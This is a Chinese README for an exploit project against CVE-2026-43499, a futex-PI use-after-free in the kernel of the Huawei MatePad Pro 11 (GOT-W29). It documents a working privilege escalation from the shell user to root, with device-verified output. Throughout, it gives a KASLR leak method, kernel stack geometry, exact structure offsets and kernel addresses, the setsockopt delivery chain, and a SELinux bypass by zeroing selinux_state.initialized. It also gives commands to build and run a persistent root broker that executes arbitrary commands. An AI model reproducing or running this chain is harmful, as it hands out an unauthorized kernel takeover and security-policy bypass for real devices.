# CVE-2026-43499 (GhostLock) — HUAWEI MatePad Pro 11 GOT-W29

针对 GOT-W29（HarmonyOS 4.0, kernel `4.19.157-perf+`）上
**CVE-2026-43499**（rtmutex/futex-PI 栈 UAF，"GhostLock"）的提权研究。

## 最终结论

1. **漏洞真实且可触发**：值持有 PI 环使 `FUTEX_CMP_REQUEUE_PI` 返回 `-EDEADLK`，
   回滚路径激活 `remove_waiter()` 的 `current != waiter->task` 清理 bug（本内核
   `kernel/locking/rtmutex.c:1110-1112`，上游修复 `3bfdc63936dd`），waiter 的
   `pi_blocked_on` 悬空（指向其内核栈 `E-0x1b0` 处的 rt_waiter）。
2. **写原语已由纯用户态端到端验证**（QEMU `kernel.patched`，无 GDB/KPM 注入）：
   EDEADLK 悬空 → `setsockopt(SOL_IP, MCAST_BLOCK_SOURCE, group_source_req 0x108)`
   投递 fake waiter（copy 落点 `E-0x210`，waiter 置于 buf+0x60 恰好覆盖 `E-0x1b0`）
   → `sched_setattr` 触发 walk → `rb_erase` 写 `sysctl_bootid`，工具自验证
   `write_ok=1`（boot_id 高 8 字节 = `0xffffff800b412320`）。这个 boot_id
   目标仅用于 `--verify-write` 自检；正式 A 路线改用独立 uuid ctl_table。
3. **早期“投递死结”结论已撤销**：旧扫描把 `sock_setsockopt` 的 0x80 帧算进了
   setsockopt 链。反汇编 + QEMU 实测确认 `__arm64_sys_setsockopt` 对
   `level != SOL_SOCKET` **直接 `blr ops->setsockopt`**，不经过 `sock_setsockopt`；
   修正后 `do_ip_setsockopt` 拷贝深度 = 0x210（旧判 0x290），几何合身。
   已排除的机制：pselect/select、ptrace、import_iovec、ppoll、SCTP（实测 0x158）。
4. **真机 A 路线已完整通过**：保留 `u:r:shell:s0`，修改 uid/gid 后通过
   `setresuid(0,0,0)` 提交合法 private root cred；`STATUS`、通用 `id`
   和完整 PTY root shell 均已在 GOT-W29 真机验证。A 路线经独立
   `random/uuid` ctl_table 做 arbitrary read，不再修改 `sysctl_bootid`，
   App 冷启动和 `/dev/ashmem<boot_id>` 正常。
5. **B 路线仍是 TODO**：`u:r:kernel:s0` 加全 capability 需要先解决 cred
   引用生命周期、RCU 回收以及 kernel 域的 exec/socket/mount 策略边界。

---

## 设备

| 项 | 值 |
|---|---|
| 型号 | HUAWEI MatePad Pro 11 GOT-W29 |
| SoC | Qualcomm kona (SM8250, Snapdragon 870) |
| 系统 | HarmonyOS 4.0 (104.0.0.136) |
| 内核 | `4.19.157-perf+`（boot.elf 反汇编 + `firmware/symtab.txt`） |
| VA | 39-bit, 4K pages, KASLR on |

## 漏洞与触发（最终版）

### 触发前提

- shell 权限：`adb shell` 或 Shizuku 均可。
- 关闭华为两个后台管控服务，使 shell 进程拿到**根 cpuset**（否则触发链不会进入目标路径）：

```sh
pm disable-user com.huawei.powergenie
pm disable-user com.huawei.iaware
```

机制：制造 PI 环（waiter→target→owner→chain→waiter）让
`FUTEX_CMP_REQUEUE_PI` 走 EDEADLK 回滚，回滚中 `remove_waiter(lock, waiter)`
用 `current`（requeue 线程）而非 `waiter->task` 清理：
`rt_mutex_dequeue` 移除真实 waiter 节点，但 **waiter 的 `pi_blocked_on` 未被清**
（`current->pi_blocked_on = NULL`），成为指向内核栈 rt_waiter 的悬空指针。

值持有环（probe 环，实测稳定 `-EDEADLK`）：

- waiter：`FUTEX_LOCK_PI(chain)` 持 chain；`FUTEX_WAIT_REQUEUE_PI(wait, 0, target)`
- owner：`FUTEX_LOCK_PI(target)` 持 target；`FUTEX_LOCK_PI(chain)` 阻塞
- main：`FUTEX_CMP_REQUEUE_PI(wait, 1, target)` → `-EDEADLK`
- waiter 超时返回（`WAIT_REQUEUE_PI` 2s）后悬空 `pi_blocked_on` 保留在栈上

注意：旧“self-own”触发、`edeadlk_probe` variant 11 的 `-EDEADLK` 都是
`owner==task` **早退**（`rtmutex.c:1035`），不产生悬空指针，无效。

## 成果

### KASLR 泄露（perf_event_open，shell 身份可行）

`perf_event_paranoid=-1` 下 `perf_event_open(PERF_SAMPLE_IP, exclude_user=1)`
采样内核文本簇，对齐已知符号偏移得 slide：

```text
samples=27651 kernel_ips=1685 lo=0xffffff948728176c hi=0xffffff9488ebfc7c
KASLR slide=0x147f200000    runtime _stext=0xffffff9487280800
```

工具：`tools/perf_kaslr.c`。

### EDEADLK 触发（悬空指针建立）

```text
[M] CMP_REQUEUE_PI ret=-1 errno=35 (EDEADLK!)
[W] WAIT_REQUEUE_PI ret=-1 errno=110 (ETIMEDOUT)  ← waiter 返回，pi_blocked_on 悬空
```

工具：`tools/edeadlk_probe.c`。

### 写原语与投递链（QEMU 端到端验证，无注入）

`rt_mutex_adjust_prio_chain` 的 walk 读悬空 `pi_blocked_on` 处的 fake rt_waiter：
- [3] `next_lock == waiter->lock`（`lock` = `empty_zero_page` 的独立槽位，见下）
- [5] `raw_spin_trylock(&lock->wait_lock)` 零锁成功
- [7] `rt_mutex_dequeue` → `rb_erase` 单左子路径：`*(rb_left) = rb_parent_color`
  → 写值 `0xffffff800b412320`（&loggers[0][1]）写入 `sysctl_bootid + 8`
- [9] ownerless 干净返回

**不需要 owner-ful 页 / `prepare_skb_payload` / `kernelsnitch`**。fake `rt_mutex`
**不能跨 walk 复用同一个槽**：walk 结束会把 `waiters.root/leftmost` 留在锁里指向
本次 waiter，第二次 walk 读到旧节点就会解引用上一轮已释放的内核栈，触发
`rt_mutex_top_waiter()` 的 `BUG_ON(w->lock != lock)`（QEMU 实测：`--verify-all`
的第二个测试直接 BUG）。实现上每次 attempt 取 `empty_zero_page + n*0x20`
（共 128 个槽，`SLIDE_LOCK_STRIDE/SLOTS`），天然全零且互不污染。

QEMU（`kernel.patched`，nokaslr，`--probe-cycle --verify-all`）工具自验证输出：

```text
4.483 237 [+] slide write boot_id raw=00000000000000002023410b80ffffff lo=0 hi=ffffff800b412320 exp_lo=0 exp_hi=ffffff800b412320 ok=1
4.547 1   [+] slide write test PASSED
6.583 240 [+] slide leaf boot_id raw=00000000000000002023410b80ffffff lo=0 hi=ffffff800b412320 exp_lo=0 exp_hi=0 ok=1
6.636 1   [+] slide leaf test PASSED
8.671 243 [+] slide read boot_id raw=100000002401000030d74c0b80ffffff lo=0000012400000010 hi=ffffff800b4cd730 exp_lo=0000012400000010 exp_hi=ffffff800b4cd730 ok=1
8.724 1   [+] slide read test PASSED
10.811 1  [+] slide restore test PASSED
10.811 1  [+] slide verify all PASSED
```

（每次 attempt 的 `requeue=-1/35 trigger=0/0 wait=-1/110 carrier=-1/22` 一致：
EDEADLK、walk 成功、hrtimer 超时、载体拷贝成功后才因假地址组返回 EINVAL。）

注意验证目标写 `boot_id + 8`：`proc_do_uuid()` 在 `bootid[8] == 0` 时会重新生成
整个 UUID，写低 8 字节会被验证读本身覆盖（QEMU 实测确认）。

### 写原语形状（`--verify-all` 全覆盖自检）

| 形状 | fake waiter tree 三词 | 效果 |
|---|---|---|
| pointer（rb_erase Case 2：单左子） | `pc=value, right=0, left=target` | `*(target) = value`（64 位全量，颜色位保留）；副作用 `*(value+8) = target`，因此 `value` 必须可读且其 +8 可牺牲 |
| leaf（Case 1：无子） | `pc=target-8, right=0, left=0` | `*(target) = 0`；只有一次干净写（无副作用），`pc` 低位=0 → RED → 不触发 rebalance，但 `__rb_change_child` 会读一次 `*(target-8)` |

### 读原语（独立 uuid ctl_table，不再污染 boot_id）

正式提权路径使用 `/proc/sys/kernel/random/uuid` 的独立 ctl_table：

```text
entry:  0xffffff800b4cd768
.data: 0xffffff800b4cd770 (初始 NULL)
```

写原语把 `.data` 指向目标地址 A 后，读 `/proc/sys/kernel/random/uuid`
返回 `[A, A+16)`；随后用 leaf-zero 把 `.data` 恢复为 NULL。boot_id
的 ctl_table 和 `sysctl_bootid[16]` 全程不参与，因此启动时创建的
`/dev/ashmem<boot_id>` 继续匹配。

约束与副作用：

- `proc_do_uuid()` 在目标窗口 byte 8 为零时可能重新生成 UUID；正式 A
  路线读取的 `task->comm`/`task->cred` 都满足该 byte 非零。
- 指针写仍有固定副作用 `*(A+8) = uuid_data_slot`。A 路线只影响当前
  task comm，代码用 `PR_GET_NAME`/`PR_SET_NAME` 恢复。
- 旧 `--verify-read` 仍通过 boot_id 做自检，会改变 high 8 字节；仅用于
  QEMU/写原语验证，不要在需要保持 App 正常的真机上运行。

### 端到端提权（A 路线：保留 shell SID，真机已完成）

`--simple-root` 不把 cred 指针直接改成 `init_cred`：

1. **perf 泄露 current**：`PERF_COUNT_SW_CPU_CLOCK` +
   `PERF_SAMPLE_REGS_INTR`，取 `__schedule` 内 `x27 = sp_el0`。QEMU
   采样期间加入同 CPU 竞争线程和 `sched_yield + nanosleep` 触发，真机
   同样已通过。
2. **读取 task/cred**：通过独立 uuid ctl_table 读 `task+0x990` 和
   `task+0x988`，comm 校验为 `"ghostloc"`。
3. **合法 root cred**：leaf-zero 清零 live cred 的 uid/gid，再调用
   `setresuid(0,0,0)`，走 `prepare_creds() -> commit_creds()` 生成
   private root cred，保留 `u:r:shell:s0`。
4. **broker**：进程进入常驻 `@gl_su` server；每个写操作消费的 waiter
   仍由 detach child 永久 park，避免 exit-time walk。

QEMU（无 KPM）与真机验证均为 `uid=0 euid=0`。真机结果：

```text
simple-root: LEGAL ROOT uid=0 euid=0 ctx=u:r:shell:s0
STATUS: uid=0 euid=0 gid=0 egid=2000 ... ctx=u:r:shell:s0
id:     uid=0(root) gid=0(root) ... context=u:r:shell:s0
```

单次失败仍可能把 fake waiter clobber 并造成 oops；设备侧继续使用
`--attempts 1`，失败就重启，不要在同一 boot 内重试。

### 后利用：root broker 与完整 PTY shell（真机已完成）

broker 启动命令：

```sh
adb shell /data/local/tmp/ghostlock_exe \
  --su-server --simple-root --fake-lock-window \
  --detach --probe-cycle --no-rt --attempts 1 \
  --leak-timeout 60 --fsync \
  --log-file /sdcard/ghostlock-su.log
```

控制命令和交互 shell：

```sh
adb shell /data/local/tmp/ghostlock_exe --rsh STATUS
adb shell /data/local/tmp/ghostlock_exe --rsh id
adb shell -t /data/local/tmp/ghostlock_exe --rsh-shell
```

`--rsh-shell` 必须使用 `adb shell -t`。broker 通过 `/dev/ptmx` 分配 PTY，
shell 子进程执行 `setsid()`/`TIOCSCTTY`；客户端将本地终端切到 raw 并传入
行列数。已验证 `tty` 返回 `/dev/pts/N`，Ctrl-C、方向键编辑和后台
`jobs` 均正常，不再出现 `won't have full job control`。

同一 boot 下冷启动 `tv.danmaku.bilibilihd` 成功（COLD，约 0.9s），无
ashmem 路径错误或 App FATAL EXCEPTION；执行前后 boot_id 和 ashmem 节点
始终匹配。

#### B 路线：kernel SID 与全 caps（TODO）

尚未完成。目标是把进程提升为 `u:r:kernel:s0` 并持有完整 capability，
同时保证 cred 生命周期和 exec 边界正确。旧研究路径直接令
`cred = &init_cred`，会出现：

- 退出时 `put_cred_rcu -> kmem_cache_free` panic；
- kernel 域不能正常 exec 用户态 shell；
- broker socket bind/mount/文件访问受 kernel 域策略限制。

待处理：合法 cred/refcount 生命周期、fork/exec root child、cred security
SID 继承、kernel 域 socket/mount 策略，以及是否需要 permissive/SID 修复。
必须在独立 QEMU 和干净真机 boot 上验证后再合入。

注意：多 vCPU 下内核会把 `__log_buf` 换成动态分配的大缓冲（8 核时 1MB），
`tools/qemu-test/read_log.py` 已改为从 `log_buf` 指针追实际缓冲区（QMP 物理读，
不再依赖 GDB 的 VA 翻译——vCPU 在 EL0 时 GDB 读不到内核地址）。

### 成功率与失败模式（QEMU 8 核实测）

`--bench 8`（每轮独立、单 attempt、无重试的指针写）：可见的 **6/6 轮全部一次成功**
——后 2 轮与汇总行当时被内核 kmsg 限流吞掉（日志里可见
`ghostlock_exe: 55 output lines suppressed due to ratelimiting`），因此这是下界。

2026-10-01 用修好的日志复跑：`--bench 10` 是 **10/10（100%）**，逐轮
`bench: run i/10 ok` 齐全、无丢行、exit 0；紧接着同一 shape 的
`--bench 30` **第 1 轮就栽了**：attempt 1 里 fake waiter 被 clobber，walk
oops（`Internal error: Oops: 96000006`、`NULL pointer dereference at 0`、
`exited with preempt_count 3`），留下的自旋锁把 8 个 vCPU 全部拖进
`__cmpwait`，整机停摆——**单次成功率虽高，但失败是致命的**：不能在同一 boot
里重试，也不能把"10/10"当成保证。

同一天用自动重开器具（`tools/qemu-test/run_rounds.py`，见其 README）补的样本：
`--bench 10` 再跑 2 轮 + `--bench 30` 连跑 6 轮 = **210/210 全部成功**（8 次
独立 boot，全程无丢行）。把这天所有模式合起来算，约 250 次 attempt 里出现
3 次 oops——**约 1%**，比早先"每 5–10 个 attempt"的估计低一个量级（早期估计
是在日志被 kmsg 限流吞掉一半的情况下得出的，偏悲观）。

限流的真正闸门是 `printk.devkmsg`（用户态写 `/dev/kmsg` 的开关，
`/proc/sys/kernel/printk_devkmsg`，默认 `ratelimit`），调 `printk_ratelimit*`
没用——实测 `printk_ratelimit_state = {interval 0, burst 1000000}` 时仍每轮丢
13–35 行（丢的正是各子项 `PASSED` 行）。QEMU 器具已改为 `-append` 带
`printk.devkmsg=on` 且 wrapper 里补写该 sysctl，之后日志一行不丢，可以重跑
`--bench N` 拿准确数字。

失败不是免费的：实测约每 100 个 attempt 会有一个的 fake waiter 被返回路径 clobber，
表现为 walk 中 oops（`Internal error … rt_mutex_adjust_prio_chain`，
`exited with preempt_count 3`）；QEMU 里一次这样的失败会把整个 guest 带走
（missed wakeup）。2026-10-01 复跑的 10 次 boot 里命中 3 次，具体签名是：oops
发生在 `rt_mutex_adjust_prio_chain+0x338`（例：`Unable to handle kernel paging
request at ffffff800ce8bcf8`），oops 时 `preempt_count=3` 留下一把没释放的
自旋锁，随后 8 个 vCPU 全停在 `queued_spin_lock_slowpath` 的 `__cmpwait`
循环（PC `0xffffff8008162b58`/`2b68`，锁字在 `X01`/`X25`，例如
`0xffffffc07a18bcac`），日志停更——**同一个 boot 内重试救不回来，只能重开**。
设备端对策：`--attempts 1`（真机 `panic_on_oops=1`，一次失败就结束这个 boot，
重试没有意义），失败后重启再来；要不要用 `--harden` 清 `panic_on_oops` 取决于
设备在 panic 后会不会自动重启，见下文"安全边界"。

历史验证（均已注入，仅存档）：QEMU GDB 直写悬空 blk；实机 KPM 重建 overlay。

### 关键偏移（boot.elf 反汇编实测，`exploit/ghostlock-source/src/target.h`）

- task_struct：cred=0x988, prio=0x184, pi_blocked_on=0xa90, usage=0x68, mm=0x728
- rt_mutex_waiter (CONFIG_HW_FUTEX_PI)：tree@0x0, pi_tree@0x18, task@0x30,
  lock@0x38, major_prio@0x40(=w8)，major_only@0x44, prio@0x48(=w9), deadline@0x50
- rt_mutex：wait_lock@0x0, waiters.root@0x8, leftmost@0x10, owner@0x18
- PAGE_OFFSET=0xffffffc000000000, PHYS_OFFSET=0x80000000 (kona),
  KIMAGE_TEXT_BASE=0xffffff8008080000

## 载体：MCAST_BLOCK_SOURCE（QEMU 实测合身）

悬空 blk = waiter 的 `__arm64_sys_futex` 入口 SP(E) − `0x1b0`。载体必须把 11 个
任意 64 位词放到 `[E-0x1b0, E-0x158)`，且这些词必须活到 consumer 触发 walk。

### 修正后的 setsockopt 链（反汇编 + QEMU 双确认）

`__arm64_sys_setsockopt`（0xffffff800999d080）对 `level == SOL_SOCKET` 才调用
`sock_setsockopt`；否则**直接 `blr ops->setsockopt`**。因此协议 handler 链比早期
估算浅 0x80（旧扫描误算了 `sock_setsockopt` 的 0x80 帧）：

| 链路（相对 E） | copy 落点 | QEMU 实测深度 |
|---|---|---|
| SCTP: wrapper 0x50 + sock_common 0x10 + sctp_setsockopt 0x100，dest sp+8 | E-0x158 | **0x158（太浅，排除）** |
| MCAST: wrapper 0x50 + sock_common 0x10 + udp 0x10 + ip 0x30 + do_ip 0x190，dest sp+0x20 | E-0x210 | **0x210（合身）** |

MCAST fit check：需要 d ∈ [0x1b0, 0x158 + size]；`group_source_req`（0x108）
满足（上限 0x260）。fake waiter 置于 buf+0x60 恰好落在 W=E-0x1b0，其后还有
0x50 字节余量；`gsr_group/gsr_source` 的 family 字段（buf+8 / buf+0x88）须为
AF_INET（QEMU 实测选项 43/44 均走 0x108 拷贝）。

### 存活条件：TIF 缓解 + park

1. 载体前 **TIF 缓解**：触 FPU（清 `TIF_FOREIGN_FPSTATE`）→ `sched_yield`
   （清 `TIF_NEED_RESCHED`）→ 触 FPU → 立即 `setsockopt`，其间不得有任何
   syscall。不缓解时 `do_notify_resume/schedule` 的帧把 `waiter->lock`（W+0x38）
   写成残留 LR `0xffffffXX08e8a0`（QEMU 复现，与设备 KPM 观测一致）。
2. 载体后 **park** 在阻塞 `pselect6(nfds=1024, 无 fd 集, NULL 超时)`（nfds>320
   走 kvmalloc，fd_set 不占本栈），保持 waiter 内核栈冻结。
3. 触发：`sched_setattr(waiter, SCHED_BATCH, nice)`（改 nice 才触发；
   policy-only 不算）；walk 在调用者上下文运行。

### 已排除的投递机制（代码已删除，仅存结论）

| 机制 | 结论 |
|---|---|
| pselect6 nfds=320 / select() | fake waiter 的 w7(lock) 落 `res_in[0]` 被 `zero_fd_set` 清零，差一格无解 |
| 阻塞 pselect6(nfds=1024) 作 carrier | nfds>320 → fd_set 走 kvmalloc，位图不在本栈窗口（投递不到） |
| ptrace `NT_PRFPREG` | 帧深 0x120（0x4e0 vs 0x1b0），覆盖不到 |
| `import_iovec` 族（readv/writev/...） | 浅 0x50 |
| ppoll `stack_pps` | 深 0x240 且超数组容限 |
| SCTP setsockopt opts 5/6/9 | 实测 0x158，太浅 |
| 单值 `get_user` 深栈写 | 旧扫描器曾报 84 个命中，复核全是 printf varargs，无用户数据 |

其余事实：

- **普通 app 域**：KASLR（perf/kallsyms/pagemap/dmesg）、`CMP_REQUEUE_PI`
  触发、major_only 链走在权限层面均被拒；`/dev/iaware_qos_ctrl` 被 SELinux 拦。
- KPM/APatch root 属“鸡生蛋”，仅作研究观测工具（见调试工具链）。

## 使用（`exploit/ghostlock-source`）

```sh
make                      # NDK r29 / host clang；LOGCAT=1（logcat）默认
./build/bin/ghostlock_exe --help

# 默认：仅 perf KASLR 泄露
./ghostlock_exe

# 写原语端到端自检：EDEADLK -> MCAST 载体 -> sched_setattr -> boot_id 校验
./ghostlock_exe --verify-write

# 全量自检：指针写 + leaf 零写 + 读原语 + 恢复（QEMU 器具用这个）
./ghostlock_exe --verify-all
./ghostlock_exe --verify-leaf          # *(bootid+0) := 0
./ghostlock_exe --verify-read          # boot_id .data 指针重定向 -> 读回

# A 路线提权（真机/QEMU 已验证）：保留 shell SID，生成 private root cred
./ghostlock_exe --simple-root --fake-lock-window \
                --detach --probe-cycle --no-rt --attempts 1

# 示例组合
./ghostlock_exe --verify-write --attempts 5 --no-rt --hold
./ghostlock_exe --selinux-relax --no-rt --attempts 4     # SELinux 放行（真机路线）
./ghostlock_exe --su-selftest --no-rt --attempts 4       # su 通道自检（QEMU 可跑）
./ghostlock_exe --su-server --simple-root \
                --fake-lock-window --detach --no-rt --attempts 1
./ghostlock_exe --rsh STATUS                             # 查询 broker
adb shell -t /data/local/tmp/ghostlock_exe --rsh-shell    # 完整 PTY shell
./ghostlock_exe --verify-all --probe-cycle \
                --kaslr-base 0xffffff8008080800 \
                --log-file /data/local/tmp/gl.log      # QEMU/nokaslr
```

参数：`--kaslr-base ADDR`、`--log-file PATH`、`--attempts N`、
`--wait-seconds N`、`--requeue-ms N`、`--no-rt`、`--rt-prio N`、
`--probe-cycle`（kernel.patched/QEMU 必需）、`--noconsume`、`--hold`、
`--detach`、`--fsync`、`--verify-write`、`--verify-leaf`、`--verify-read`、
`--verify-all`、`--simple-root`、`--escalate`（B 研究，legacy）、
`--bench N`、`--harden`、`--selinux-relax`、`--su-server`、`--su-selftest`、
`--rsh CMD`、`--rsh-shell`、`--fake-lock-window`、`--waiter-task-own`、
`--leak-timeout N`、`--fake-lock-addr ADDR`、`--do-futex-waiter-off N`、
`--shell PATH`、`--serve-count N`、`--slot-file PATH`。**环境变量已
全部移除**（含旧 `GOT_*` 实验开关）。

### fake-lock 槽位账本（跨进程）

每次 walk 消耗 `empty_zero_page` 的一个 0x20 槽（共 128 个），槽用过后
`waiters.root/leftmost` 会残留指向本次 waiter，**同一 boot 内不可复用**。
槽号记在 `/data/local/tmp/gl.slot`（以 `boot_id` 为界：重启后归零），所以
多进程、多 group 运行不会从 0 重新开始撞上脏槽；耗尽时干净报错而不是
回绕（回绕会触发 `BUG_ON(w->lock != lock)`）。`--slot-file ""` 可关闭该
账本（仅单进程场景）。

### SELinux（真机路线，静态分析已定）

本内核 `CONFIG_SECURITY_SELINUX_DEVELOP` 未开：`selinux_state` 里**没有**
`enforcing` 字段，`/sys/fs/selinux/enforce` 读路径编译成常量 1（上游行为，
不是华为桩）。一键放行点是 `selinux_state.initialized`：

| 目标 | 链接地址 | 写 | 效果 |
|---|---|---|---|
| `selinux_state.initialized`（+2） | `0xffffff800c3b3002` | leaf 零写 | `security_compute_av()` 直接 `allowed=0xffffffff`，所有检查放行 |
| `avc_cache.avc_cache_threshold` | `0xffffff800b79c388` | leaf 零写 | AVC 自清空（否则历史 deny 缓存仍然拒绝） |

顺序：提权 → 备份 `cat /sys/fs/selinux/policy` → `--selinux-relax`
（两个叶写）→ 用已知会被拒的操作验证。注意：任何策略重载
（`/sys/fs/selinux/load`）都会把 `initialized` 置回 1，需要重新执行。
mrx 风格的 `policydb.permissive_map` 备选地址：node=`0xffffff800b7a1220`、
highbit=`0xffffff800b7a1228`（注意它按 **type** 而非 SID 置位，且写原语
写不出任意小整数 startbit，一般不如 `initialized` 路线）。`--selinux-relax`
在 QEMU 里只能证明两个叶写落地（guest 无策略），语义效果需真机确认；
2026-10-01 复跑：`--selinux-relax` 在干净 boot 上 attempt 1 通过，两个叶写
`ok=1`（`avc=ffffff800b79c388 initialized=ffffff800c3b3002`），退出码 0。

### 常驻 root 通道（su server / broker，mrx-w09 移植）

`--su-server`：先提权，然后在抽象 UNIX socket `@gl_su` 上常驻（`--serve-count N`
限制请求数，0 = 无限）。请求行协议：

- `STATUS` / `GLCAP` → uid/euid/gid/egid、CapEff/CapPrm、SELinux context
- `GLSHELL|rows|cols` → 在独立 PTY 中启动 `/system/bin/sh -i`
- `GLMOUNT|src|tgt|fstype|flags_hex|data`（`-` = NULL）→ 在 root 进程里 mount
- `GLUMOUNT|tgt|flags` → umount2
- 其它任何一行 → `/system/bin/sh -c <行>`（`--shell PATH` 可换）

客户端：`--rsh 'CMD'` 用于单命令；`--rsh-shell` 通过
`adb shell -t` 接入完整 PTY。客户端在 KASLR 之前分派，不需要等待 perf。
服务进程**永不退出**（退出会走悬空 `pi_blocked_on` 的 exit walk）。

A 路线在 GOT-W29 真机的实测：

```text
STATUS: uid=0 euid=0 gid=0 egid=2000 cap_eff=0 cap_prm=0 ctx=u:r:shell:s0
id:     uid=0(root) gid=0(root) ... context=u:r:shell:s0
tty:    /dev/pts/5
jobs:   [1] + Running  sleep 30
```

`GLSHELL` 使用 `/dev/ptmx`，子 shell 通过 `setsid()`/`TIOCSCTTY` 获得
控制终端；客户端本地 terminal 切 raw 并发送窗口尺寸，因此 Ctrl-C、
方向键和作业控制正常。QEMU 无 PTY shell 时，`--su-selftest` 仍覆盖
STATUS/GLCAP/GLMOUNT/GLUMOUNT 和通用命令行路径。

QEMU 以本程序做 /init 时注意：内核没有控制台，fd 0/1/2 可能未打开，
需在 wrapper 里先补上可用 fd（否则 `pipe()` 会占用 fd 0/1，子进程的
printf 会写进结果管道）。

### 设备端试跑（真机恢复后）

```sh
adb push exploit/ghostlock-source/build/bin/ghostlock_exe /data/local/tmp/
adb shell /data/local/tmp/ghostlock_exe \
  --su-server --simple-root --fake-lock-window \
  --detach --probe-cycle --no-rt --attempts 1 \
  --leak-timeout 60 --fsync \
  --log-file /sdcard/ghostlock-su.log

adb shell /data/local/tmp/ghostlock_exe --rsh STATUS
adb shell /data/local/tmp/ghostlock_exe --rsh id
adb shell -t /data/local/tmp/ghostlock_exe --rsh-shell
```

安全边界：消费过悬空指针的进程必须 park/停住，**不要 `kill -9`**
（`futex_exit_release` 会再走悬空 `pi_blocked_on`，软挂/panic）；要停止用
`kill -STOP`，清理优先重启。输出里若没有 `requeue=-1/35`（EDEADLK），改用
`--probe-cycle` 重试（值持有环在部分固件上更稳）。

失败 attempt 可能触发 oops。**GOT-W29 真机的 `panic_on_oops=1`（实测）**，所以
失败不是"卡一下"而是直接 panic。A 路线一次成功也要跑多次 walk（comm 读、
uuid restore、cred 读、uuid restore、uid/gid leaf 写），因此设备侧必须使用
`--attempts 1`，失败就重启，不要在同一 boot 内重试。

接下来要问的是"panic 之后设备会不会自己重启"，这决定了要不要用 `--harden`：

- 若会自动重启（看 `cat /proc/sys/kernel/panic`，非 0 就是 N 秒后重启；华为的
  AP 看门狗也可能兜底）：panic 反而是**干净的恢复路径**——重启后悬空指针随进程
  消失，重新来过即可。这种情况下**不要**清 `panic_on_oops`：清掉之后失败会变成
  "8 核全卡死、要手动长按电源"的形态，比自动重启难受得多。
- 若不会自动重启（panic 停在屏幕上）：两种形态都要人工断电；此时再考虑
  `--harden` leaf 零写清 `panic_on_oops`。`--harden` 自己就是一次写原语
  尝试，同样吃失败风险。

无论哪种情况，真机上都要用 `--attempts 1`：一次失败已经结束这个 boot，
重试没有意义。消费过悬空 waiter 的 detach child 不能直接 kill，清理靠重启。

## 调试工具链

`tools/kpm-debug/rtmutex_dbg.c`，KernelPatch 0.13.5 inline-hook，用于实机观测，
hook 集：`rt_mutex_adjust_pi`（记录/重建 overlay）、
`rt_mutex_adjust_prio_chain`（dump waiter）、`__arm64_sys_pselect6`/`do_select`
（fd_set 观测）、`__arm64_sys_futex`（wait/requeue 追踪）、`rt_mutex_dequeue`
（step[7] 确认）。加载方式见 `tools/kpm-debug/Makefile`（`make rtmutex_dbg.kpm`，
需要 KernelPatch 源码树 `KP_DIR`）与 `sc_kpm_load.c`（supercall 加载器）、
`run_rtmdbg_test.sh`（实机跑一轮并抓 `[RTMDBG]` 日志）。

QEMU 启动 / kernel.patched（SCM+PAN 补丁）见 `firmware/README.md`；
GDB 断点与内存读取工具：`tools/qemu_read_ram.py`、`tools/patch_kernel_qemu.sh`。

## 目录

```
firmware/                     boot.img 解包产物 + QEMU 启动（kernel.patched）
exploit/ghostlock-source/     MCAST 载体写原语（main/util/slide/perf，命令行参数）
tools/                        KASLR/EDEADLK 探针、载体扫描器、KPM 工具链、
                              QEMU 验证器具（qemu-test/）
```

## 致谢

- **同 CVE 华为 MRX-W09 移植（4.14.116，已完整提权）：
  [0ch4/mrx-w09-ghostlock](https://gitlab.com/0ch4/mrx-w09-ghostlock)**——
  本项目参考价值最高的一份工作：投递载体（setsockopt 系）与后利用链思路都源于它，
  没有它本项目会卡在"用户态数据投不到悬空 waiter"这一步。
- **[@sudaoer](https://github.com/sudaoer) 在
  [issue #1](https://github.com/zzzxxxxxxxxxx/GhostLock-GOT-W29/issues/1)
  的建议**——用系统包内核镜像 + SELinux 规则复刻 QEMU 虚拟机、外部 gdb 调试、
  无限重试，跑通再上真机。本项目的 QEMU 验证路线（kernel.patched、
  `tools/qemu-test/` 自检、fork-per-attempt 重试）由此而来。
- 上游 PoC: [x-spy/CVE-2026-43499-popsicle](https://github.com/x-spy/CVE-2026-43499-popsicle),
  [soralis0912/CVE-2026-43499-aristotle](https://github.com/soralis0912/CVE-2026-43499-aristotle),
  [JoinChang/ghostlock-oneplus](https://github.com/JoinChang/ghostlock-oneplus),
  [Wtrwx/smt878u-ionstack-poc](https://github.com/Wtrwx/smt878u-ionstack-poc) (GPL-3.0)
- CVE: [NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-43499),
  [Red Hat RHSB-2026-010](https://access.redhat.com/security/vulnerabilities/RHSB-2026-010)
